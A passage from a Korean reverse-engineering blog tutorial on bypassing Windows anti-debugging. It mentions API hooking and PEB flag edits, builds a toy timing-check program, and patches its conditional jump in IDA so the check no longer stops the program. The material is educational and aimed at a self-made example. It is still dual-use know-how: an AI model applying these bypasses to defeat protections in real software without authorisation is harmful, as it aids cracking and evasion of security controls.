&#xAC19;&#xC774; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%208.png" alt="image.png"></p><p>&#xB2F9;&#xC5F0;&#xD788; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xBD99;&#xC774;&#xC9C0; &#xC54A;&#xC740; &#xB85C;&#xCEEC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xBA74; <code>No debugger found.</code> &#xAC00; &#xCD9C;&#xB825;&#xB418;&#xC5B4;&#xC694;. &#xADF8;&#xB7FC; &#xC774;&#xC81C; IDA&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xBD99;&#xC774;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;!!</p><p><img src="image%209.png" alt="image.png"></p><p>&#xC624;&#xC6B0;&#xC57C;&#x2026; IDA&#xB97C; &#xD1B5;&#xD574; &#xB514;&#xBC84;&#xAE45; &#xC911;&#xC784;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xBABB;&#xCC3E;&#xC558;&#xB2E4;&#xACE0; &#xC2E4;&#xD589;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="1b18ed6b-05c4-4b20-a412-522bd1c12bb3.png" alt="image.png"></p><p>&#xC774;&#xB807;&#xAC8C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; API &#xD6C4;&#xD0B9;&#xC744; &#xD1B5;&#xD574; Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC744; &#xBB34;&#xB825;&#xD654;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xC815;&#xBCF4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAD6C;&#xD604;&#xB41C; &#xAE30;&#xBC95;&#xC774;&#xAE30;&#xC5D0; </p><ul><li><code>NtQueryInformationProcess()</code> &#xC640; &#xAC19;&#xC774; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <strong>&#xD568;&#xC218;&#xB97C; &#xD6C4;&#xD0B9;</strong>&#xD558;&#xAC70;&#xB098;</li><li>PEB&#xC758; <code>BeingDebugged</code> &#xD50C;&#xB798;&#xADF8; &#xB4F1; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xACFC; &#xAD00;&#xB828;&#xB418;&#xB294; &#xC815;&#xBCF4;&#xB97C; <strong>&#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0;&#xC11C; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C;</strong> <strong>&#xC218;&#xC815;</strong>&#xD574;&#xC11C; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<ul><li>&#xC774; &#xCE5C;&#xAD6C;&#xB4E4;&#xC740; &#xBCF4;&#xD1B5; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xD1B5;&#xD574; &#xAC12;&#xC774; &#xBCC0;&#xC870;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p>&#xADF8;&#xB7EC;&#xBA74; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC6D0;&#xB9AC;&#xB97C; &#xC5ED;&#xC774;&#xC6A9;&#xD558;&#xB294; <strong>Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;</strong>&#xC740; &#xC5B4;&#xB5BB;&#xAC8C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;? Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC740; &#xD55C; &#xBC88; &#xD574;&#xC81C;&#xD558;&#xBA74; &#xC774;&#xD6C4; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB514;&#xBC84;&#xAE45;&#xC5D0; &#xBB38;&#xC81C;&#xAC00; &#xC5C6;&#xC9C0;&#xB9CC;, Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC740; &#xC2E4;&#xD589; &#xC911; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xC801;&#xC6A9;&#xB418;&#xBBC0;&#xB85C; &#xB9E4;&#xBC88; &#xC6B0;&#xD68C;&#xD574;&#xC57C; &#xD558;&#xAC70;&#xB098;, &#xBCF4;&#xB2E4; &#xADFC;&#xBCF8;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xB300;&#xC751;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xBA70; &#xCC28;&#xC774;&#xB97C; &#xB290;&#xAEF4;&#xBCF4;&#xC2DC;&#xC8E0;! </p><h2 id="Dynamic-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;-&#xC2E4;&#xC2B5;"><a href="#Dynamic-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;-&#xC2E4;&#xC2B5;" class="headerlink" title="Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C; &#xC2E4;&#xC2B5;"></a>Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C; &#xC2E4;&#xC2B5;</h2><h3 id="1-&#xC77C;&#xBC18;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;-1"><a href="#1-&#xC77C;&#xBC18;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;-1" class="headerlink" title="1. &#xC77C;&#xBC18; &#xD504;&#xB85C;&#xADF8;&#xB7A8;"></a>1. &#xC77C;&#xBC18; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</h3><p>Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xC2E4;&#xC2B5;&#xB3C4; &#x201C;Part 1&#x201D;&#xC5D0;&#xC11C; &#xC54C;&#xC544;&#xBD24;&#xB358; Timing &#xAE30;&#xBC18; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC758; &#xCF54;&#xB4DC;&#xB97C; x86&#xC73C;&#xB85C; &#xBE4C;&#xB4DC;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><pre><code class="hljs c"><span class="hljs-comment">// main.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt; </span></span><span class="hljs-comment">// &#xD0A4; &#xBCF5;&#xD638;&#xD654; &#xD568;&#xC218;</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decryptKey</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* key)</span> </span>{    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(key); i++) {        key[i] = key[i]<span class="hljs-number">-1</span>; <span class="hljs-comment">// &#xAC04;&#xB2E8;&#xD55C; Ceaser &#xC554;&#xD638;&#xD654;</span>    }}<span class="hljs-comment">// &#xC911;&#xC694;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xD568;&#xC218;</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">processImportantData</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* key)</span> </span>{    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Processing important data with key: %s\n&quot;</span>, key);    <span class="hljs-comment">// &#xAC04;&#xB2E8;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Important data processed successfully!\n&quot;</span>);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-keyword">char</span> key[] = <span class="hljs-string">&quot;nztfdsfulfz&quot;</span>;    <span class="hljs-comment">// [1] &#xD0C0;&#xC774;&#xBC0D; &#xAE30;&#xBC18; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;: &#xD568;&#xC218; &#xC2E4;&#xD589; &#xC2DC;&#xAC04;&#xC744; &#xCE21;&#xC815;&#xD558;&#xC5EC; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xAE34; &#xC2DC;&#xAC04; &#xC18C;&#xC694; &#xC2DC; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xBD99;&#xC5C8;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;</span>    <span class="hljs-keyword">uint64_t</span> start_time = GetTickCount64();    decryptKey(key);    <span class="hljs-keyword">uint64_t</span> end_time = GetTickCount64();    <span class="hljs-keyword">uint64_t</span> elapsed_time = end_time - start_time;    <span class="hljs-comment">// [2] 1&#xCD08; &#xC774;&#xC0C1; &#xAC78;&#xB9AC;&#xBA74; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xBD99;&#xC5C8;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;</span>    <span class="hljs-keyword">if</span> (elapsed_time &gt; <span class="hljs-number">1000</span>) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debugger detected!\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// &#xCF54;&#xB4DC; &#xC885;&#xB8CC;</span>    }    <span class="hljs-comment">// [3] &#xD0A4;&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xC911;&#xC694;&#xD55C; &#xB85C;&#xC9C1; &#xC2E4;&#xD589;: &#xBCF5;&#xD638;&#xD654;&#xB41C; &#xD0A4;&#xC640; &#xBE44;&#xAD50;&#xD558;&#xC5EC; &#xC815;&#xC0C1; &#xB3D9;&#xC791; &#xC5EC;&#xBD80; &#xD310;&#xB2E8;</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(key, <span class="hljs-string">&quot;mysecretkey&quot;</span>) == <span class="hljs-number">0</span>) {        processImportantData(key);    }    <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid key!\n&quot;</span>);    }    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC774; &#xCF54;&#xB4DC;&#xB294; &#xD0C0;&#xC774;&#xBC0D; &#xAE30;&#xBC18; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC911;&#xC694;&#xD55C; &#xB85C;&#xC9C1;, &#xC989; &#xD0A4; &#xBCF5;&#xD638;&#xD654; &#xB85C;&#xC9C1;&#xC744; &#xBCF4;&#xD638;&#xD569;&#xB2C8;&#xB2E4;([1]).  &#xB9CC;&#xC57D; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD0A4; &#xBCF5;&#xD638;&#xD654; &#xB85C;&#xC9C1;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD558;&#xBA74;, &#xC2E4;&#xD589; &#xC2DC;&#xAC04;&#xC758; &#xCC28;&#xC774;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; ([2]) &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;. &#xBC18;&#xB300;&#xB85C;, &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC2E4;&#xD589; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; ([3]) &#xB85C;&#xC9C1;&#xC774; &#xBB38;&#xC81C;&#xC5C6;&#xC774; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xBE4C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p><p><img src="image%2010.png" alt="image.png"></p><p>&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xC774; &#xC798;&#xB429;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C;&#xB294; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; <code>Important data processed successfully!</code> &#xAC00; &#xCD9C;&#xB825;&#xC774; &#xB418;&#xC9C0;&#xB9CC; &#xC774;&#xD6C4; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; &#xC911;&#xC694;&#xD55C; &#xB85C;&#xC9C1;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB418;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB124; &#xC774;&#xC81C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD588;&#xC73C;&#xB2C8;&#xAE4C; IDA&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xB300;&#xD574; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC2DC;&#xB3C4;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="image%2011.png" alt="image.png"></p><p>&#xC544;&#xBB34;&#xB798;&#xB3C4; &#xC800;&#xD76C;&#xAC00; &#xAD81;&#xAE08;&#xD55C;&#xAC74; &#xD0A4; &#xBCF5;&#xD638;&#xD654; &#xB85C;&#xC9C1;&#xC774;&#xB2C8; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xB294; &#xD568;&#xC218;&#xC5D0; Break Point(&#xB2E8;&#xCD95;&#xD0A4;: F2)&#xB97C; &#xAC78;&#xC5B4;&#xC11C; &#xB514;&#xBC84;&#xAE45;(F9)&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;. Step Into(F7)&#xB85C; &#xD574;&#xB2F9; &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C; &#xB85C;&#xC9C1;&#xC744; &#xBCF8; &#xD6C4; &#xC5B4;&#xB5BB;&#xAC8C; &#xBCF5;&#xD638;&#xD654;&#xB418;&#xB294;&#xC9C0; &#xD30C;&#xC545; &#xD6C4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xACC4;&#xC18D; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;&#xBCF4;&#xBA74;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xD0D0;&#xC9C0;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xB728;&#xBA74;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="2f9db531-4021-4c69-9805-b40c8cb60ee0.png" alt="image.png"></p><p>&#xBE44;&#xB85D; &#xC9C0;&#xAE08;&#xC740; &#xB2E8;&#xC21C;&#xD55C; &#xC608;&#xC81C;&#xC77C;&#xC9C0;&#xB77C;&#xB3C4;, &#xC2E4;&#xD589;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xAC12;&#xC774; &#xBCC0;&#xACBD;&#xB41C;&#xB2E4;&#xBA74; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD1B5;&#xD574; &#xAC12;&#xC744; &#xCD94;&#xCD9C;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xAC15;&#xC81C; &#xC885;&#xB8CC;&#xB418;&#xC5B4; &#xADF8; &#xAC12;&#xC744; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC740; &#xC0AC;&#xC6A9;&#xC790; &#xAE30;&#xC220; &#xC219;&#xB828;&#xB3C4;&#xC5D0; &#xB530;&#xB77C; &#xBCF4;&#xD638; &#xC218;&#xC900;&#xC774; &#xD06C;&#xAC8C; &#xB2EC;&#xB77C;&#xC9C0;&#xBBC0;&#xB85C;, &#xACE0;&#xB3C4;&#xC758; &#xAE30;&#xC220;&#xC744; &#xC801;&#xC6A9;&#xD558;&#xBA74; &#xBD84;&#xC11D;&#xC744; &#xB354;&#xC6B1; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-&#xBC14;&#xC774;&#xB108;&#xB9AC;-&#xD328;&#xCE58;-Bypass-Dynamic-Anti-Debugging"><a href="#2-&#xBC14;&#xC774;&#xB108;&#xB9AC;-&#xD328;&#xCE58;-Bypass-Dynamic-Anti-Debugging" class="headerlink" title="2. &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD328;&#xCE58; (Bypass Dynamic Anti-Debugging)"></a>2. &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD328;&#xCE58; (Bypass Dynamic Anti-Debugging)</h3><p>&#xC704; &#xCF54;&#xB4DC;&#xC758; &#xD750;&#xB984;&#xC0C1; &#xC5B4;&#xB5A4; &#xBD80;&#xBD84;&#xC744; &#xD328;&#xCE58;&#xD558;&#xBA74; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;? </p><p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; 2&#xAC1C;&#xC758; &#xACBD;&#xC6B0;&#xB97C; &#xC0DD;&#xAC01;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xACA0;&#xC8E0;?</p><blockquote><p><strong>&#x2460; &#xD0C0;&#xC774;&#xBC0D; &#xCCB4;&#xD06C;&#xB97C; &#xBB34;&#xB825;&#xD654;</strong></p><ol><li><code>GetTickCount64()</code> &#xD568;&#xC218; &#xD638;&#xCD9C; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC544;&#xC11C; &#xD328;&#xCE58;<ol><li>NOP&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xBA85;&#xB839;&#xC744; &#xBB34;&#xB825;&#xD654;&#xD558;&#xAC70;&#xB098; &#xD2B9;&#xC815;&#xD55C; &#xC0C1;&#xC218;&#xAC12;&#xC744; &#xBC18;&#xD658;&#xD558;&#xB294; &#xD568;&#xC218;&#xB85C; &#xD328;&#xCE58; &#xB4F1;</li></ol></li><li><code>if (elapsed_time &gt; 1000)</code> &#xBD80;&#xBD84;&#xC744; <code>if (elapsed_time &lt; 0)</code> &#xAC19;&#xC740; <strong>&#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xC870;&#xAC74;</strong>&#xC73C;&#xB85C; &#xBCC0;&#xACBD;<ul><li>&#xB610;&#xB294; <code>jmp</code>&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xD56D;&#xC0C1; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xB418;&#xB3C4;&#xB85D; &#xC218;&#xC815;</li></ul></li></ol><p><strong>&#x2461; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC885;&#xB8CC; &#xBC29;&#xC9C0;</strong></p><p><code>printf(&quot;Debugger detected!\n&quot;); return 1;</code> &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC544;&#xC11C; <code>return 1;</code>&#xC744; <strong>NOP(0x90)&#xB85C; &#xD328;&#xCE58;</strong></p></blockquote><p>&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC5D0; &#xB530;&#xB77C; &#xBD84;&#xAE30;&#xBB38;&#xC774; &#xC2E4;&#xC81C;&#xC640; &#xB2EC;&#xB77C;&#xC9C8; &#xC218; &#xC788;&#xC73C;&#xB2C8;&#xAE4C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC0C1; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xB294;&#xC9C0; IDA&#xB97C; &#xD1B5;&#xD574; &#xD55C;&#xBC88; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="image%2012.png" alt="image.png"></p><p>&#xC800;&#xB294; &#xC5EC;&#xAE30;&#xC11C; 16&#xBC88;&#xC9F8; &#xC904;&#xC744; &#xD328;&#xCE58;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xC0C1;&#xC73C;&#xB85C;&#xB294; 0x00271E8E&#xC5D0; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xC778;&#xB370;&#xC694;. &#xC5EC;&#xAE30;&#xC11C; CF&#xC640; ZF&#xAC00; 0&#xC774;&#xBA74;, &#xC989; <code>elapsed_time</code>&#xC774; 1&#xCD08;&#xBCF4;&#xB2E4; &#xC9E7;&#xC544;&#xC57C; &#xD558;&#xB294;&#xB370; &#xC800;&#xB294; jbe&#xB97C; ja&#xB85C; &#xD328;&#xCE58;&#xD574;&#xC11C; 1&#xCD08;&#xBCF4;&#xB2E4; &#xAE38;&#xB54C;&#xB9CC; &#xD0A4;&#xB97C; &#xBCF4;&#xB294; &#xB85C;&#xC9C1;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. 16&#xBC88;&#xC9F8; &#xC904;&#xC744; &#xB204;&#xB978; &#xD6C4; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; 2&#xAC1C;&#xC758; jump &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCCAB;&#xBC88;&#xC9F8; &#xBA85;&#xB839;&#xC5B4;&#xB294; NOP&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xD558;&#xACE0; &#xB450;&#xBC88;&#xC9F8; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; ja&#xB85C; &#xD328;&#xCE58;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%2013.png" alt="image.png"></p><p>&#xB124; &#xADF8;&#xB7EC;&#xBA74; &#xC774;&#xC81C; &#xC544;&#xAE4C;&#xCC98;&#xB7FC; &#xD0A4; &#xBCF5;&#xD638;&#xD654; &#xD568;&#xC218;&#xC5D0; Break Point&#xB97C; &#xAC78;&#xC5B4;&#xC11C; &#xB514;&#xBC84;&#xAE45; &#xC2DC;&#xAC04;&#xC744; 1&#xCD08;&#xB97C; &#xB118;&#xAE34; &#xD6C4; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>F9&#xB97C; &#xB20C;&#xB7EC; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xBA74;</p><p><img src="image%2014.png" alt="image.png"></p><p>&#xCC98;&#xC74C;&#xC5D0; &#xC124;&#xC815;&#xD588;&#xB358; Break Point&#xB97C; &#xD1B5;&#xD574;&#xC11C; <code>decryptKey</code> &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xD568;&#xC218; &#xBD84;&#xC11D;&#xC744; &#xB05D;&#xB0B8; &#xD6C4; &#xACC4;&#xC18D; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC774;&#xC5B4;&#xAC00;&#xBA74; 2&#xBC88;&#xC9F8; BP&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image%2015.png" alt="image.png"></p><p>2&#xBC88;&#xC9F8; BP&#xB97C; &#xB9CC;&#xB098;&#xBA74; &#x201C;Edit&gt;Patch Program&gt;Assemble&#x201C; &#xC744; &#xD1B5;&#xD574; jbe&#xB97C; ja&#xB85C; &#xBC14;&#xAFD4;&#xC8FC;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC6B0;&#xD68C;&#xD568;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p><p><img src="image%2016.png" alt="image.png"></p><p>&#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xC774;&#xBC88; &#xC2E4;&#xC2B5;&#xACFC; &#xAC19;&#xC740; &#xC0C1;&#xD669;&#xC5D0;&#xC11C;&#xB294; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C; <code>CF</code>, <code>ZF</code> &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC218;&#xC815;&#xD55C;&#xB2E4;&#xAC70;&#xB098; GetTickCount() &#xD568;&#xC218;&#xB97C; &#xD6C4;&#xD0B9;&#xD574;&#xC11C; &#xC0C1;&#xC218;&#xAC12;&#xB9CC;&#xC744; &#xBC18;&#xD658;&#xD558;&#xAC8C; &#xD55C;&#xB2E4;&#xB294; &#xB4F1;&#xC73C;&#xB85C;&#xB3C4; &#xCDA9;&#xBD84;&#xD788; &#xB514;&#xBC84;&#xAC70; &#xAC80;&#xC0AC; &#xB85C;&#xC9C1;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h1><p><img src="Debug_part2.jpg" alt="Debug_part2.jpg"></p><p>&#xC624;&#xB298; &#xC2E4;&#xC2B5;&#xD55C; &#xAE30;&#xBC95;&#xC740; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xC6B0;&#xD68C;&#xB97C; &#xC704;&#xD55C; &#xB300;&#xD45C;&#xC801;&#xC778; &#xC608;&#xC2DC;&#xB4E4;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xAE30;&#xBC95;&#xC740; &#x201C;&#xD568;&#xC815;&#xCE74;&#xB4DC;&#x201D;&#xCC98;&#xB7FC; &#xBCF4;&#xC548; &#xC194;&#xB8E8;&#xC158;&#xC774; &#xD2B9;&#xC815; &#xB3D9;&#xC791;&#xC744; &#xB9C9;&#xC73C;&#xB824; &#xD560; &#xB54C; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><blockquote><p>Debugger&#xB97C; 